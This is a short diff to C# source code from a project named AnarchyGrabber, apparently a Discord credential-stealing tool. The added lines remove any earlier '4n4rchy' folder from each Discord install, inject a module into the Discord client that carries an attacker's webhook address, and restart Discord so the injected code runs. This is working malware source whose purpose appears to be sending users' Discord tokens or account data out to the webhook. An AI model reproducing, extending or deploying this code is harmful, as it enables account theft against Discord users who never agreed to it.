@@ -1,4 +1,5 @@
 ﻿using System;
+using System.IO;
 
 namespace AnarchyGrabber
 {
@@ -12,6 +13,14 @@ namespace AnarchyGrabber
 
             foreach (DiscordBuild build in Enum.GetValues(typeof(DiscordBuild)))
             {
+                if (OxygenInjector.TryGetDiscordPath(build, out string path))
+                {
+                    string anarchyPath = Path.Combine(path, "4n4rchy");
+
+                    if (Directory.Exists(anarchyPath))
+                        Directory.Delete(anarchyPath);
+                }
+
                 if (OxygenInjector.Inject(build, "4n4rchy", "inject", $"process.env.anarchyHook = '{Settings.Webhook.Replace("https://discordapp.com/api/webhooks/", "")}'", injectFile, modFile) && build == DiscordBuild.Discord)
                     OxygenInjector.RestartDiscord(); // Oxygen can only restart Discord Stable atm
             }
